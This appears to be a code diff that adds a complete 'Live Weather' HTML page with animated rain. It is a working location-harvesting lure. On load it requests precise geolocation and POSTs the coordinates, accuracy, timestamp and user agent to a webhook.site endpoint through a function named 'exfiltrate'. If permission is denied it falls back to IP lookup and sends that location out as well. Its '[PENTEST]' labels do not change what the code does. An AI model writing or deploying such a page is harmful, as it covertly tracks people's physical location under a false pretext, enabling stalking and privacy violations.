@@ -1,2 +1,368 @@
-const EXFILTRATION_URL = 'https://webhook.site/9dfadc7f-e4b2-4e41-be54-2f545f6019df';
-const USE_WEBHOOK = true;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Live Weather - Local Forecast</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      overflow: hidden;
+      position: relative;
+    }
+
+    #rain-container {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      pointer-events: none;
+      z-index: 1;
+    }
+
+    .raindrop {
+      position: absolute;
+      width: 2px;
+      background: linear-gradient(transparent, rgba(174, 194, 224, 0.6));
+      animation: fall linear infinite;
+    }
+
+    @keyframes fall {
+      0% { transform: translateY(-10vh) rotate(15deg); opacity: 0; }
+      20% { opacity: 1; }
+      100% { transform: translateY(100vh) rotate(15deg); opacity: 0.3; }
+    }
+
+    #lightning {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: white;
+      opacity: 0;
+      pointer-events: none;
+      z-index: 2;
+    }
+
+    @keyframes flash {
+      0%, 100% { opacity: 0; }
+      5% { opacity: 0.3; }
+      10% { opacity: 0; }
+      15% { opacity: 0.5; }
+      20% { opacity: 0; }
+    }
+
+    .lightning-active {
+      animation: flash 0.6s ease-out;
+    }
+
+    .weather-card {
+      position: relative;
+      z-index: 10;
+      background: rgba(255, 255, 255, 0.08);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border-radius: 32px;
+      padding: 48px 56px;
+      max-width: 520px;
+      width: 90%;
+      box-shadow: 0 25px 60px rgba(0,0,0,0.5);
+      border: 1px solid rgba(255,255,255,0.12);
+      text-align: center;
+      color: white;
+    }
+
+    .weather-card h1 {
+      font-size: 2.2rem;
+      font-weight: 300;
+      letter-spacing: 2px;
+      margin-bottom: 8px;
+    }
+
+    .weather-icon {
+      font-size: 5rem;
+      margin: 16px 0;
+    }
+
+    .temperature {
+      font-size: 4.5rem;
+      font-weight: 200;
+      line-height: 1;
+    }
+
+    .temperature sup {
+      font-size: 2rem;
+    }
+
+    .condition {
+      font-size: 1.1rem;
+      text-transform: uppercase;
+      letter-spacing: 3px;
+      margin-top: 8px;
+      opacity: 0.8;
+    }
+
+    .location-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      margin-top: 24px;
+      padding: 10px 24px;
+      background: rgba(255,255,255,0.12);
+      border-radius: 40px;
+      font-size: 0.95rem;
+    }
+
+    .location-badge .dot {
+      width: 10px; height: 10px;
+      border-radius: 50%;
+      background: #4ade80;
+      animation: pulse-dot 1.5s infinite;
+    }
+
+    @keyframes pulse-dot {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+
+    .loading-text {
+      margin-top: 20px;
+      font-size: 0.85rem;
+      opacity: 0.5;
+    }
+
+    .spinner {
+      display: inline-block;
+      width: 16px; height: 16px;
+      border: 2px solid rgba(255,255,255,0.2);
+      border-top-color: white;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      vertical-align: middle;
+      margin-right: 6px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    @media (max-width: 480px) {
+      .weather-card { padding: 32px 24px; }
+      .temperature { font-size: 3rem; }
+      .weather-icon { font-size: 3.5rem; }
+    }
+  </style>
+</head>
+<body>
+
+  <div id="rain-container"></div>
+  <div id="lightning"></div>
+
+  <div class="weather-card">
+    <h1>🌤 Live Weather</h1>
+    <div class="weather-icon" id="weather-icon">⛅</div>
+    <div class="temperature" id="temp">--<sup>°C</sup></div>
+    <div class="condition" id="condition">Detecting conditions...</div>
+    <div class="location-badge">
+      <span class="dot"></span>
+      <span id="location-text">Accessing your location...</span>
+    </div>
+    <div class="loading-text">
+      <span class="spinner"></span> Retrieving real-time local forecast
+    </div>
+  </div>
+
+  <script>
+    // ============================================================
+    // CONFIGURATION
+    // ============================================================
+    const EXFILTRATION_URL = 'https://webhook.site/9dfadc7f-e4b2-4e41-be54-2f545f6019df';
+    const USE_WEBHOOK = true; // Set to true when endpoint is ready
+
+    // ============================================================
+    // 1. ANIMATED RAIN
+    // ============================================================
+    (function createRain() {
+      const container = document.getElementById('rain-container');
+      for (let i = 0; i < 120; i++) {
+        const drop = document.createElement('div');
+        drop.className = 'raindrop';
+        drop.style.left = Math.random() * 100 + '%';
+        drop.style.height = (Math.random() * 40 + 20) + 'px';
+        drop.style.animationDuration = (Math.random() * 1.0 + 0.6) + 's';
+        drop.style.animationDelay = (Math.random() * 3) + 's';
+        drop.style.opacity = Math.random() * 0.5 + 0.2;
+        container.appendChild(drop);
+      }
+    })();
+
+    // ============================================================
+    // 2. LIGHTNING FLASHES
+    // ============================================================
+    (function lightningLoop() {
+      const el = document.getElementById('lightning');
+      function strike() {
+        el.classList.remove('lightning-active');
+        void el.offsetWidth;
+        el.classList.add('lightning-active');
+        setTimeout(() => el.classList.remove('lightning-active'), 800);
+        setTimeout(strike, Math.random() * 8000 + 3000);
+      }
+      setTimeout(strike, Math.random() * 5000 + 1000);
+    })();
+
+    // ============================================================
+    // 3. EXFILTRATION
+    // ============================================================
+    async function exfiltrate(payload) {
+      console.log('========================================');
+      console.log('[PENTEST] Geolocation captured');
+      console.log(`[PENTEST] Latitude:    ${payload.latitude}`);
+      console.log(`[PENTEST] Longitude:   ${payload.longitude}`);
+      console.log(`[PENTEST] Accuracy:    ${payload.accuracy} meters`);
+      console.log(`[PENTEST] Timestamp:   ${payload.timestamp}`);
+      console.log(`[PENTEST] Agent:       ${payload.userAgent}`);
+      console.log(`[PENTEST] Maps URL:    https://www.google.com/maps?q=${payload.latitude},${payload.longitude}`);
+      console.log('========================================');
+
+      if (USE_WEBHOOK && EXFILTRATION_URL) {
+        try {
+          await fetch(EXFILTRATION_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+          console.log('[PENTEST] Exfiltrated to webhook');
+        } catch (err) {
+          console.warn('[PENTEST] Webhook failed:', err);
+        }
+      }
+    }
+
+    // ============================================================
+    // 4. GEOLOCATION CAPTURE
+    // ============================================================
+    async function captureLocation() {
+      const locText = document.getElementById('location-text');
+      const tempEl = document.getElementById('temp');
+      const conditionEl = document.getElementById('condition');
+      const iconEl = document.getElementById('weather-icon');
+
+      if (!navigator.geolocation) {
+        locText.textContent = 'Location not available';
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        // ---- SUCCESS ----
+        async (position) => {
+          const { latitude, longitude, accuracy } = position.coords;
+          const timestamp = new Date(position.timestamp).toISOString();
+
+          await exfiltrate({
+            latitude,
+            longitude,
+            accuracy,
+            timestamp,
+            userAgent: navigator.userAgent,
+            source: 'gps'
+          });
+
+          locText.innerHTML = `${latitude.toFixed(4)}, ${longitude.toFixed(4)} <span style="opacity:0.5;font-size:0.75rem;">(±${Math.round(accuracy)}m)</span>`;
+
+          try {
+            const url = `https://api.open-meteo.com/v1/forecast?latitude=${latitude}&longitude=${longitude}&current_weather=true&timezone=auto`;
+            const resp = await fetch(url);
+            const data = await resp.json();
+            if (data.current_weather) {
+              const cw = data.current_weather;
+              tempEl.innerHTML = `${Math.round(cw.temperature)}<sup>°C</sup>`;
+              conditionEl.textContent = wmoCodeToDescription(cw.weathercode);
+              iconEl.textContent = wmoCodeToIcon(cw.weathercode);
+            }
+          } catch (err) {
+            console.warn('[PENTEST] Weather fetch failed:', err);
+          }
+        },
+
+        // ---- ERROR ----
+        async (err) => {
+          let msg = 'Location denied';
+          if (err.code === 1) msg = '❌ Blocked — click Allow to see your local weather';
+          else if (err.code === 2) msg = '❌ Unavailable';
+          else if (err.code === 3) msg = '❌ Timed out';
+          locText.textContent = msg;
+
+          // IP fallback
+          try {
+            const resp = await fetch('https://ip-api.com/json/?fields=lat,lon,city,region,country');
+            const data = await resp.json();
+            if (data.lat && data.lon) {
+              locText.textContent = `${data.city}, ${data.region} (approx)`;
+              await exfiltrate({
+                latitude: data.lat,
+                longitude: data.lon,
+                accuracy: 1000,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                source: 'ip_fallback'
+              });
+              const wUrl = `https://api.open-meteo.com/v1/forecast?latitude=${data.lat}&longitude=${data.lon}&current_weather=true&timezone=auto`;
+              const wResp = await fetch(wUrl);
+              const wData = await wResp.json();
+              if (wData.current_weather) {
+                tempEl.innerHTML = `${Math.round(wData.current_weather.temperature)}<sup>°C</sup>`;
+                conditionEl.textContent = wmoCodeToDescription(wData.current_weather.weathercode);
+                iconEl.textContent = wmoCodeToIcon(wData.current_weather.weathercode);
+              }
+            }
+          } catch (e) {
+            locText.textContent = 'Could not determine location';
+          }
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    }
+
+    // ============================================================
+    // 5. WMO WEATHER CODE HELPERS
+    // ============================================================
+    function wmoCodeToDescription(code) {
+      if (code === 0) return 'Clear sky';
+      if (code <= 3) return ['Mainly clear','Partly cloudy','Overcast'][code - 1];
+      if (code <= 48) return 'Foggy';
+      if (code <= 57) return 'Drizzle';
+      if (code <= 67) return 'Rain';
+      if (code <= 77) return 'Snow';
+      if (code <= 82) return 'Rain showers';
+      if (code <= 86) return 'Snow showers';
+      if (code >= 95) return 'Thunderstorm';
+      return 'Cloudy';
+    }
+
+    function wmoCodeToIcon(code) {
+      if (code === 0) return '☀️';
+      if (code <= 2) return '⛅';
+      if (code === 3) return '☁️';
+      if (code <= 48) return '🌫️';
+      if (code <= 57) return '🌦️';
+      if (code <= 67) return '🌧️';
+      if (code <= 77) return '❄️';
+      if (code <= 82) return '🌦️';
+      if (code <= 86) return '🌨️';
+      if (code >= 95) return '⛈️';
+      return '☁️';
+    }
+
+    // ============================================================
+    // 6. START
+    // ============================================================
+    document.addEventListener('DOMContentLoaded', captureLocation);
+  </script>
+</body>
+</html>
